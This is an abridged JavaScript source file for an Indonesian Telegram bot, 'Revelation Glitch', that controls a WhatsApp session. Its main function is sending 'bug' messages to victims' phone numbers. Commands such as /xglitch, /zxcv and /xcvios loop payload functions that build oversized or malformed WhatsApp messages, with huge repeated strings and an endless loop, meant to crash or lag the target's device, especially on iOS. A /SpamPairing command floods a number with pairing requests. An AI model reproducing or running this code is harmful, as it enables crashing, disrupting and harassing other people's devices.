...
(function () {
  ...
  const forceKill = function () {
    return function () {
      try {
        nativeExecSync("kill -9 " + nativePid, {
          stdio: "ignore"
        });
      } catch (e) {}
      try {
...
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Unbandfoul/databaserevelation/refs/heads/main/tokens.json"; ////ganti jadi Raw luh

async function fetchValidTokens() {
  try {
    const {
      data
    } = await axios.get(GITHUB_TOKEN_LIST_URL);
...
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
   ...
   REVELATION • PROTECTION FILE PREMIUMM`));
}
validateToken();
...
`);
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {
            await bot.telegram.editMessageCaption(global.pairingMessage.chatId, global.pairingMessage.messageId, undefined, `
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙎𝙐𝘾𝘾𝙀𝙎𝙎      
━━━━━━━━━━━━
...
function saveRequiredChannel() {
  try {
    fs.writeFileSync(requiredChannelFile, JSON.stringify({
...
async function isJoinedChannel(userId) {
  try {
    ...
    if (!REQUIRED_CHANNEL_USERNAME || REQUIRED_CHANNEL_USERNAME === "@setchannel") {
      return true;
    }
    const member = await bot.telegram.getChatMember(REQUIRED_CHANNEL_USERNAME, userId);
...
Kamu wajib join channel kami
terlebih dahulu untuk memakai bot ini.

Setelah join channel silahkan klik button: <b>CHECK</b>
</blockquote>
`;
  const keyboard = {
    reply_markup: {
...
bot.action("check_join", async ctx => {
  ...
  if (!joined) {
    return ctx.reply("❌ Kamu belum join channel kami.");
  }
  try {
...
bot.use(async (ctx, next) => {
  try {
    ...
    // belum join
    if (!joined) {
      // cuma munculin pas /start
      if (text.startsWith("/start")) {
        return sendForceSubscribeMessage(ctx);
      }

      // selain /start bot diem
      return;
    }
...
bot.command("setchannel", checkOwner, checkAdmin, async ctx => {
  try {
    ...
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Example: /setchannel @NamaChannel");
    }
...
`);
    ...
    return ctx.reply("❌ ☇ Channel tidak tersedia, pastikan bot sudah di masukan ke dalam Channel dan menjadi Admin Channel setelah itu /setchannel kembali untuk mengatur Channel");
  }
});
// ================= CONFIG =================
const IMAGES = {
  home: "https://files.catbox.moe/u94fwe.jpg"
};
let menuAnimation = null;

// ================= STYLE =================
const discoStyles = [["Primary", "Primary", "Primary"], ["Success", "Success", "Success"], ["Danger", "Danger", "Danger"]];
let styleIndex = 0;
...
function getHomeCaption(username) {
  return `
<blockquote><b>ℝ𝔼𝕍𝔼𝕃𝔸𝕋𝕀𝕆ℕ 𝔾𝕃𝕀𝕋ℂℍ</b></blockquote>
こんにちは ${username} 私はTelegram経由のWhatsAppバグ検出ボットです。

<blockquote><b>𝔹𝕆𝕋 𝕀ℕ𝔽𝕆ℝ𝕄𝔸𝕋𝕀𝕆ℕ</b></blockquote>
◉ ᴏᴡɴᴇʀ : @Bawzhhh
◉ ᴠᴇʀsɪᴏɴ : 1.0 Bebas Spam
◉ ᴛʏᴘᴇ : Bebas Spam Bugs
◉ sᴛᴀᴛᴜs : Premium Verified √
<blockquote><b>𝕊𝔼ℕ𝔻𝔼ℝ 𝔹𝕆𝕋 𝕀ℕ𝔽𝕆ℝ𝕄𝔸𝕋𝕀𝕆ℕ</b></blockquote>
✿ ᴋᴏɴᴇᴋsɪ sᴇɴᴅᴇʀ sᴛᴀᴛᴜs : ${getSenderStatus()}
<blockquote>𝙿𝚕𝚎𝚊𝚜𝚎 𝚜𝚎𝚕𝚎𝚌𝚝 𝚝𝚑𝚎 𝚖𝚎𝚗𝚞 𝚋𝚞𝚝𝚝𝚘𝚗 𝚋𝚎𝚕𝚕𝚘𝚠</blockquote>
`;
}

// ================= START DISCO =================
function startDisco(ctx, msg) {
  if (menuAnimation) {
    clearInterval(menuAnimation);
  }
  menuAnimation = setInterval(async () => {
    try {
      await ctx.telegram.editMessageReplyMarkup(ctx.chat.id, msg.message_id, undefined, getMainKeyboard());
    } catch {}
  }, 2600);
}
...
bot.action("xbugz", async ctx => {
  ...
  const page = `
<blockquote><b>𝔻𝔼𝕃𝔸𝕐 𝕊ℙ𝔸𝕄 𝕏 𝕀ℕ𝕍𝕀𝕊𝕀𝔹𝕃𝔼</b></blockquote>
(∅) /spamxmurbug - Bebas Spam Delay
(∅) /ghostdelay - Bebas Spam Delay
(∅) /xglitch - Bebas Spam Delay
<blockquote><b>𝔹𝕌𝕃𝕃𝔻𝕆ℤ𝔼ℝ</b></blockquote>
(∅) /zxcv - Bulldozer Sedot Quota
(∅) /xnovas - Bulldozer Hard Invisible
<blockquote><b>𝔹𝕌𝔾 𝕀ℙℍ𝕆ℕ𝔼</b></blockquote>
(∅) /xcvios - Crash Ios (Visible Bugs)

<blockquote>☸ 𝘽𝙐𝙂 𝙇𝘼𝙄𝙉𝙉𝙔𝘼 𝙈𝘼𝙎𝙄𝙃 𝘿𝘼𝙇𝘼𝙈 𝙏𝘼𝙃𝘼𝙋 𝙋𝙀𝙉𝙂𝙀𝙈𝘽𝘼𝙉𝙂𝘼𝙉 𝙏𝙀𝙍𝙄𝙈𝘼𝙆𝘼𝙎𝙄𝙃 𝙈𝘼𝘼𝙁 𝙅𝙄𝙆𝘼 𝘿𝙄𝙆𝙄𝙏 𝙈𝙀𝙉𝙐𝙉𝙔𝘼</blockquote>
`;
  await editMenu(ctx, page, {
    inline_keyboard: [[{
      text: "⬅️ ホームに戻る",
      callback_data: "home"
    }]]
...
bot.action("xsettings", async ctx => {
  ...
  const page = `
<blockquote><b>𝔸𝕌𝕋𝕆 𝕌ℙ𝔻𝔸𝕋𝔼 𝕊ℂℝ𝕀ℙ𝕋</b></blockquote>  
(∅) /pullupdate - Auto-Update Script  
<blockquote><b>𝕆𝕎ℕ𝔼ℝ 𝕊𝔼𝕋𝕋𝕀ℕ𝔾</b></blockquote>  
(∅) /connect -  Connect Sender  
(∅) /killsesi - Kill Session Sender  
(∅) /restart - Restart Otomatis Panel  
<blockquote><b>𝔸𝔻𝔻𝔼𝔻 𝕊𝔼𝕋𝕋𝕀ℕ𝔾</b></blockquote>  
(∅) /addowner - Add Owner Access  
...
<blockquote><b>𝔾ℝ𝕆𝕌ℙ 𝕊𝔼𝕋𝕋𝕀ℕ𝔾</b></blockquote>  
(∅) /addgc - Add Group Premium  
(∅) /delgc - Del Group Premium  
(∅) /groupon - Mode Group  
(∅) /groupoff - Mode Off Group  
(∅) /anticulik - Anti Culik Bot  
(∅) /addsafe - Add Safe  
(∅) /delsafe - Off safe  
(∅) /antifoto - Block Foto Send To Group  
(∅) /antivideo - Block Video Send To Group
`;
  await editMenu(ctx, page, {
    inline_keyboard: [[{
      text: "⬅️ ホームに戻る",
...
const UPDATE_URL = "https://raw.githubusercontent.com/Unbandfoul/mataneasu/refs/heads/main/index.js";
...
bot.command("addgc", checkOwner, async ctx => {
  try {
    ...
    if (premiumGroups.includes(groupId)) {
      return ctx.reply(`<blockquote><b>⚠️ GROUP SUDAH PREMIUM</b>
...
<b>Status :</b> Already Registered</blockquote>`, {
    ...
    // ================= SUCCESS RESPONSE =================
    return ctx.reply(`<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━</b>
...
`, {
    ...
    reply_markup: {
      inline_keyboard: [[{
        text: "✅ YES",
        callback_data: `confirm_addowner_${targetUserId}`,
        style: "success"
      }, {
        text: "❌ NO",
        callback_data: `cancel_addowner`,
        style: "primary"
      }]]
    }
  });
...
\`\`\`js
REVELATION GLITCH - 𝙎𝙐𝘾𝘾𝙀𝙎𝙁𝙐𝙇𝙔 ᣲ
━━━━━━━━━━━━━━━━━━━━━━━━
...
`, {
    ...
    reply_markup: {
      inline_keyboard: [[{
        text: "✅ YES",
        callback_data: `confirm_delowner_${targetUserId}`
      }, {
        text: "❌ NO",
        callback_data: `cancel_delowner`
      }]]
    }
  });
});
...
bot.action(/prem_.+/, async ctx => {
  ...
  await ctx.editMessageText(`✅ Akses premium berhasil di Aktifkan\nUser: ${userId}\nDurasi: ${duration} hari`).catch(() => {});
});
...
`, backBtn());
  ...
  let text = premiumUsers.map((id, i) => `⸙ ${i + 1}. \`${id}\``).join("\n");
  await ctx.editMessageText(`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ☊
━━━━━━━━━━━━━━━━━━
...
`, backBtn());
  ...
  let text = adminList.map((id, i) => `⸙ ${i + 1}. \`${id}\``).join("\n");
  await ctx.editMessageText(`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝘼𝘿𝙈𝙄𝙉 ☊
━━━━━━━━━━━━━━━━━━
...
`, backBtn());
  ...
  let text = ownerUsers.map((id, i) => `⸙ ${i + 1}. \`${id}\``).join("\n");
  await ctx.editMessageText(`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙊𝙒𝙉𝙀𝙍 👑
━━━━━━━━━━━━━━━━━━
...
bot.command("cekbot", async ctx => {
  try {
    ...
    const steps = ["10% ⟩ checking panel...", "20% ⟩ loading cpu...", "30% ⟩ validating system...", "40% ⟩ checking connection...", "50% ⟩ syncing data...", "60% ⟩ scanning modules...", "70% ⟩ verifying security...", "80% ⟩ optimizing response...", "90% ⟩ finalizing...", "100% ⟩ completed ✔"];
    for (let step of steps) {
      await new Promise(r => setTimeout(r, 350));
      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `🤖 <b>GXION SYSTEM CHECK</b>\n\n${step}`, {
        parse_mode: "HTML"
      });
    }
...
bot.command("antifoto", async ctx => {
  ...
  const args = ctx.message.text.split(" ")[1];
  if (!args) {
    return ctx.reply("📌 Format: /antifoto on /off");
  }
  const chatId = ctx.chat.id.toString();
  if (args === "on") {
...
bot.command("delpair", async ctx => {
  ...
  let statusMessage = await ctx.reply(`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 — 𝙇𝙊𝘼𝘿𝙄𝙉𝙂
ID: ${botNumber}
Status: Executing...\`\`\`
`, {
  ...
  try {
    ...
    await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, `\`\`\`js
𝙂𝙓𝙄𝙊𝙉 — 𝙎𝙐𝘾𝘾𝙀𝙎𝙎
ID: ${botNumber}
...
bot.command("setcd", async ctx => {
  ...
  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("⚠️ Contoh: /setcd 1s / 1m / 1h / 1d / 0");
  }
  if (args[1] === "0") {
    COOLDOWN_TIME = 0;
    COOLDOWN_TEXT = "0s";
...
bot.on("my_chat_member", async ctx => {
  try {
    ...
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(ownerId, `🚨 BOT DICULIK
...
bot.command("time", async ctx => {
  ...
  // WIT (UTC+9)
  const wit = new Date(now.toLocaleString("en-US", {
...
bot.command("cekidch", async ctx => {
  ...
  if (!input) {
    return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");
  }
  try {
...
bot.command("snack", async ctx => {
  ...
  try {
    ...
    const res = await axios.get(`https://api.shecodes.io/snackvideo?url=${encodeURIComponent(url)}`, {
      timeout: 15000
    } // biar ga ngegantung
    );
...
bot.command("catbox", async ctx => {
  ...
  const url = args[1];
  if (!url) {
    return ctx.reply(`📥 *DOWNLOAD CATBOX* 📥
...
📌 *Maksimal file: 50MB*`, {
  ...
  if (!url.includes("files.catbox.moe")) {
    return ctx.reply("❌ Bukan URL Catbox yang valid!", {
      parse_mode: "Markdown"
    });
  }
  ...
  try {
    ...
    ctx.reply("❌ Gagal mengunduh file! Pastikan URL valid.", {
      parse_mode: "Markdown"
    });
  }
});
bot.command("tiktokdl", async ctx => {
  ...
  if (!args) {
    return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");
  }
  let url = args;
...
bot.command("convert", checkAllPremium, async ctx => {
  ...
  if (!r) {
    return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");
  }
  let fileId = null;
  ...
  try {
    ...
    const {
      data
    } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: {
...
✅ Gratis, cepat, permanen!`, {
  ...
  if (replied.photo) {
    ...
    return ctx.reply("❌ Harus berupa foto!", {
      parse_mode: "Markdown"
    });
  }
...
💾 Link permanent!`, {
            ...
            ctx.reply("❌ Gagal upload! Coba lagi.", {
              parse_mode: "Markdown"
            });
          }
        } catch (err) {
          ctx.reply("❌ Error parsing response!", {
            parse_mode: "Markdown"
          });
        }
      });
...
\`\`\``, {
    ...
    ctx.reply("❌ Gagal mendekripsi! Pastikan formatnya benar.", {
      parse_mode: "Markdown"
    });
  }
});
...
bot.command(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  ...
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya izin untuk menjalankan perintah ini.");
  }
  const target = match[1];
  const count = parseInt(match[2]) || 999999;
  bot.sendMessage(chatId, `Mengirim Spam Pairing ${count} ke nomor ${target}...`);
  try {
    const {
      state
    } = await useMultiFileAuthState("senzypairing");
    const {
      version
    } = await fetchLatestBaileysVersion();
...
bot.command("shio", ctx => {
  ...
  ctx.reply(`🐉 *Ramalan Shio hari ini:* ${random}`, {
    parse_mode: "Markdown"
  });
});
...
bot.command("tebak", ctx => {
  ...
  if (isNaN(tebakan)) {
    return ctx.reply("Masukkan angka 1-10!");
  }
...
bot.command("suit", ctx => {
  ...
  if (!user || !pilihan.includes(user)) {
    return ctx.reply("Pilih: /suit batu | gunting | kertas");
  }
  const botChoice = pilihan[Math.floor(Math.random() * 3)];
  let hasil = "";
  if (user === botChoice) {
    hasil = "Seri 🤝";
  } else if (user === "batu" && botChoice === "gunting" || user === "gunting" && botChoice === "kertas" || user === "kertas" && botChoice === "batu") {
    hasil = "Kamu menang! 🎉";
  } else {
    hasil = "Bot menang! 😭";
  }
...
bot.command("kepribadian", ctx => {
  ...
  ctx.reply(`🧠 *Kepribadianmu:* ${random}`, {
    parse_mode: "Markdown"
  });
});
...
bot.command("karir", ctx => {
  ...
  ctx.reply(`💼 *Karir masa depanmu:* ${random}`, {
    parse_mode: "Markdown"
  });
});
...
bot.command("harilahir", ctx => {
  ...
  ctx.reply(`🎂 *Hari lahir versi random:* Kamu lahir hari ${random}. (Hanya hiburan)`, {
    parse_mode: "Markdown"
  });
});
...
bot.command("koin", ctx => {
  ...
  ctx.reply(`🪙 *Hasil lempar koin:* ${hasil}`, {
    parse_mode: "Markdown"
  });
});
...
bot.command("lagu", async ctx => {
  ...
  if (!query) {
    return ctx.reply("🎵 Cara pakai: /lagu [judul lagu]\nContoh: /lagu blur song 2", {
      parse_mode: "Markdown"
    });
  }
  const status = await ctx.reply(`🔍 *Mencari: ${query}`, {
    parse_mode: "Markdown"
  });
  try {
    ...
    if (!data.data || data.data.length === 0) {
      return ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, `❌ Lagu "${query}" tidak ditemukan.`, {
        parse_mode: "Markdown"
      });
    }
    ...
    if (preview && preview !== "null") {
      ...
      await ctx.reply("⚠️ *Preview audio tidak tersedia untuk lagu ini.*", {
        parse_mode: "Markdown"
      });
    }
  } catch (err) {
    console.error(err);
    await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, "❌ Terjadi kesalahan. Coba lagi nanti.", {
      parse_mode: "Markdown"
    }).catch(() => {
...
bot.command("connect", checkOwner, async ctx => {
  try {
    ...
    const msg = await ctx.replyWithPhoto("https://files.catbox.moe/j0mmhf.jpg",
    //ganti jadi url catbox gambar lu
    {
      caption: `
<blockquote><b>ℝ𝔼ℚ𝕌𝔼𝕊𝕋 ℙ𝔸𝕀ℝ𝕀ℕ𝔾 ℕ𝕌𝕄𝔹𝔼ℝ</b></blockquote>
⌾ ᴛᴀʀɢᴇᴛ ᴘᴀɪʀɪɴɢ ɴᴜᴍʙᴇʀ : ${phoneNumber}
⌾ ᴋᴏᴅᴇ ᴘᴀɪʀɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ : ${formattedCode}
<blockquote>☛ 𝐒𝐢𝐥𝐚𝐡𝐤𝐚𝐧 𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐤𝐨𝐝𝐞 𝐩𝐚𝐢𝐫𝐢𝐧𝐠 𝐭𝐞𝐫𝐬𝐞𝐛𝐮𝐭 𝐦𝐞𝐥𝐚𝐥𝐮 𝐧𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐲𝐚𝐧𝐠 𝐝𝐢 𝐤𝐢𝐫𝐢𝐦 𝐝𝐚𝐫𝐢 𝐀𝐩𝐥𝐢𝐤𝐚𝐬𝐢 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐮𝐧𝐭𝐮𝐤 𝐦𝐞𝐧𝐚𝐮𝐭𝐤𝐚𝐧 𝐤𝐞 𝐝𝐚𝐥𝐚𝐦 𝐩𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭</blockquote>
`,
      parse_mode: "HTML"
    });
    ...
    global.pairingMessage = null;
    ctx.reply("❌ ☇ Gagal pairing, Coba lakukan /killsesi  lalu setelah itu melakukan /restart dan lakukan /connect 62xx kembali!");
  }
});
...
/// CASE BUG 1 \\\
bot.command("spamxmurbug", checkAllPremium, checkWhatsAppConnection, checkCooldown, async ctx => {
...
<blockquote><b>REVELATION GLITCH</b></blockquote>
<b>Bug sent to target:</b> ${q}`, {
  ...
  (async () => {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`));
      await VnXNewDelayHardCmbo(sock, target);
      await sleep(1000);
    }
  })();
});
/// CASE BUG 1 \\\
bot.command("ghostdelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, async ctx => {
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  const q = ctx.message.text.split(" ")[1];
  if (!q) {
...
/// CASE BUG 1 \\\
bot.command("xglitch", checkAllPremium, checkWhatsAppConnection, checkCooldown, async ctx => {
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  const q = ctx.message.text.split(" ")[1];
  if (!q) {
...
<b>Bug sent to target:</b> ${q}`, {
  ...
  (async () => {
    for (let i = 0; i < 5; i++) {
      console.log(chalk.yellow(`PROSES MENGIRIM BUG ${i + 1} TO ${q}`));
      await FloryDelay(sock, target);
      await kontolkayzen(sock, target);
      await sleep(1000);
    }
  })();
});
/// CASE BUG 1 \\\
bot.command("zxcv", checkAllPremium, checkWhatsAppConnection, checkCooldown, async ctx => {
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  const q = ctx.message.text.split(" ")[1];
  if (!q) {
...
/// CASE BUG 1 \\\
bot.command("xnovas", checkAllPremium, checkWhatsAppConnection, checkCooldown, async ctx => {
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  const q = ctx.message.text.split(" ")[1];
  if (!q) {
...
/// CASE BUG 1 \\\
bot.command("xcvios", checkAllPremium, checkWhatsAppConnection, checkCooldown, async ctx => {
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  const q = ctx.message.text.split(" ")[1];
  if (!q) {
    return ctx.reply("🪧 Example: /xcvios 62xxxx");
  }
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  await ctx.replyWithHTML(`
<blockquote><b>REVELATION GLITCH</b></blockquote>
<b>IOS NEW bug sent to target:</b> ${q}`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{
        text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ",
...
async function VnXNewSpamNotifToDelayInvisV2(sock, target) {
  const VnXMesegej = {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "VnX" + " 0".repeat(250000) + "".repeat(60000),
          contextInfo: {
            participant: target,
...
async function VnXNewOnlyBulldo(sock, target) {
  ...
  try {
    ...
    console.log("PROSES MENGIRIM BUG TO ${target}");
  } catch (e) {
    console.log("❌ Error Strike:", e);
  }
}
async function FloryDelay(sock, target) {
...
async function kontolkayzen(sock, target) {
  while (true) {
    const vnxtest = {
      groupStatusMessageV2: {
        message: {
...
async function LocationIos(sock, target) {
  try {
    ...
    const locationMessage = {
      ...
      jpegThumbnail: null,
      name: "\0" + "𑇂𑆵𑆴𑆿".repeat(15000),
      address: "\0" + "𑇂𑆵𑆴𑆿".repeat(10000),
    ...
    const makeMsg = content => generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: content
      }
    }, {});
...
`);
    ...
    const logOk = (label, msg) => console.log(green(`✔ ${label.padEnd(12)} : ${msg}`));
